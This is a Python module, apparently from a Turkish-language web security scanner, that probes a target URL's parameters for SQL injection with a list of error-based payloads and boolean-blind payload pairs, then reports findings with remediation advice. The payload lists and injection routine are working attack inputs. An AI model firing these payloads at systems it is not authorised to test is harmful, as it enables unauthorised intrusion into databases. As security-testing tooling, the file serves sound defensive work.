#!/usr/bin/env python3
"""
Maxima Cog: SQL Injection Scanner — Temel/Hızlı Versiyon

Klasik error-based (~20 payload) ve boolean blind (4 çift) SQL injection taraması.
Derin tarama için modül 39 (DeepSQLiScanner) kullanılmalıdır — o modül time-based,
UNION, stacked queries, WAF bypass, header/JSON injection, 2nd-order ve 90+ imza içerir.
"""

import re
import urllib.parse
from typing import Dict, List, Tuple
from utils.base_module import BaseModule, ModuleResult

# ── DB hata imzaları (4 ana motor) ────────────────────────────
DB_ERRORS: Dict[str, List[str]] = {
    "MySQL":      ["you have an error in your sql syntax", "warning: mysql_",
                   "mysql_fetch_array", "supplied argument is not a valid mysql",
                   "mysql server version for the right syntax"],
    "PostgreSQL": ["pg_query()", "unterminated quoted string at or near",
                   "syntax error at or near"],
    "MSSQL":      ["unclosed quotation mark after the character string",
                   "incorrect syntax near", "microsoft sql server"],
    "SQLite":     ["sqlite3.operationalerror", "sqlite error", 'near "syntax"'],
}

# ── Error-based payloads (~20) ────────────────────────────────
ERROR_PAYLOADS: List[str] = [
    "'", "''", '"', "\\", "' OR '1'='1", "' OR '1'='1'--", "' OR 1=1--",
    "' OR 1=1#", "') OR ('1'='1", "1' ORDER BY 100--", "' AND 1=1--",
    "' AND 1=2--", "' HAVING 1=1--", "' GROUP BY 1--", "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--", "'--", "'#", "((( ' )))", "9999'",
]

# ── Boolean blind çiftleri (4 çift) ──────────────────────────
BOOLEAN_PAIRS: List[Tuple[str, str]] = [
    ("' AND 1=1--", "' AND 1=2--"),       ("' AND 'a'='a'--", "' AND 'a'='b'--"),
    ("1 AND 1=1",   "1 AND 1=2"),         ("' OR 1=1--",      "' OR 1=2--"),
]

_SKIP_PARAMS = {"submit", "csrf", "_token", "nonce", "__viewstate"}


def _has_db_error(body: str, baseline: str = "") -> Tuple[bool, str, str]:
    for db, sigs in DB_ERRORS.items():
        for s in sigs:
            if s in body and (not baseline or s not in baseline):
                return True, s, db
    return False, "", ""


class SQLInjectionScanner(BaseModule):
    """Temel SQL Injection tarayıcı — error-based + boolean blind."""

    def run(self) -> ModuleResult:
        self.log("Temel SQLi taraması başlatılıyor (error + boolean)...", "info")
        params = self._find_params()
        if not params:
            params = [("id","1"),("q","test"),("search","a"),("user","admin"),("page","1")]
        self.log(f"{len(params)} parametre bulundu", "info")

        before = len(self.results["findings"])
        vuln = set()
        for p, d in params[:8]:
            if p in vuln:
                continue
            self.log(f"  → {p}={d}", "info")
            if self._error_based(p, d):
                vuln.add(p); continue
            if self._boolean_blind(p, d):
                vuln.add(p)

        self.results["summary"].update({
            "Taranan Parametre": len(params), "Savunmasız Parametre": len(vuln),
            "Toplam Bulgu": len(self.results["findings"]) - before,
            "Teknikler": "Error-Based / Boolean Blind",
        })
        return self.results

    # ── parametre keşfi ──────────────────────────────────────
    def _find_params(self) -> List[Tuple[str, str]]:
        found: List[Tuple[str, str]] = []
        seen: set = set()
        def _add(k: str, v: str = "1") -> None:
            k = k.strip()
            if k and k.lower() not in _SKIP_PARAMS and k not in seen:
                seen.add(k); found.append((k, v or "1"))
        parsed = urllib.parse.urlparse(self.url)
        for k, v in urllib.parse.parse_qsl(parsed.query):
            _add(k, v)
        try:
            body = self.http_get(self.url).get("body", "")
            for m in re.finditer(r'<input[^>]+name=["\']([^"\']+)["\'][^>]*'
                                 r'(?:value=["\']([^"\']*)["\'])?', body, re.I):
                _add(m.group(1), m.group(2) or "1")
        except Exception:
            pass
        return found

    def _inject_url(self, param: str, payload: str) -> Dict:
        parsed = urllib.parse.urlparse(self.url)
        qs = dict(urllib.parse.parse_qsl(parsed.query))
        qs[param] = payload
        new_qs = urllib.parse.urlencode(qs)
        url = parsed._replace(query=new_qs).geturl() if parsed.query \
              else self.url.rstrip("?") + "?" + new_qs
        return self.http_get(url)

    # ── error-based ──────────────────────────────────────────
    def _error_based(self, param: str, default: str) -> bool:
        base = self._inject_url(param, default).get("body", "").lower()
        for pay in ERROR_PAYLOADS:
            try:
                body = self._inject_url(param, pay).get("body", "").lower()
                ok, sig, db = _has_db_error(body, base)
                if ok:
                    self.add_finding(f"SQL Injection — Error-Based ({db})",
                                     f"Param:{param} | Payload:{pay[:60]} | İmza:\"{sig}\"",
                                     "critical",
                                     remediation="Parametrized query (prepared statement) kullanın. "
                                                 "ORM tercih edin. Kullanıcı girdisini doğrudan SQL'e eklemeyin.",
                                     evidence=f"Payload: {pay} → DB hatası: {sig}")
                    return True
            except Exception:
                continue
        return False

    # ── boolean blind ────────────────────────────────────────
    def _boolean_blind(self, param: str, default: str) -> bool:
        # Adaptive threshold: baseline varyansı ölç (aynı isteği 2 kez)
        b1 = len(self._inject_url(param, default).get("body", ""))
        b2 = len(self._inject_url(param, default).get("body", ""))
        baseline_variance = abs(b1 - b2) / max(b1, b2, 1)
        # Eşik: baseline varyansının 3 katı veya minimum %15
        threshold = max(0.15, baseline_variance * 3 + 0.05)

        for tp, fp in BOOLEAN_PAIRS:
            try:
                rt = self._inject_url(param, default + tp)
                rf = self._inject_url(param, default + fp)
                ct, cf = rt.get("status", 0), rf.get("status", 0)
                lt, lf = len(rt.get("body", "")), len(rf.get("body", ""))
                if ct != cf and 0 not in (ct, cf):
                    self.add_finding("SQL Injection — Boolean Blind (HTTP durum farkı)",
                                     f"Param:{param} | TRUE:{ct} FALSE:{cf} | {tp[:50]}",
                                     "critical",
                                     remediation="Parametrized query (prepared statement) kullanın.",
                                     evidence=f"TRUE status: {ct}, FALSE status: {cf}")
                    return True
                if lt > 100 and lf > 100:
                    diff = abs(lt - lf) / max(lt, lf)
                    if diff > threshold:
                        self.add_finding("SQL Injection — Boolean Blind (içerik farkı)",
                                         f"Param:{param} | TRUE:{lt}B FALSE:{lf}B diff:{diff*100:.0f}% | {tp[:50]}",
                                         "high",
                                         remediation="Parametrized query (prepared statement) kullanın. "
                                                     "Boolean blind SQLi, WAF ile engellenemez — kod düzeyinde düzeltilmeli.",
                                         evidence=f"TRUE body: {lt}B, FALSE body: {lf}B, fark: {diff*100:.0f}%")
                        return True
            except Exception:
                continue
        return False
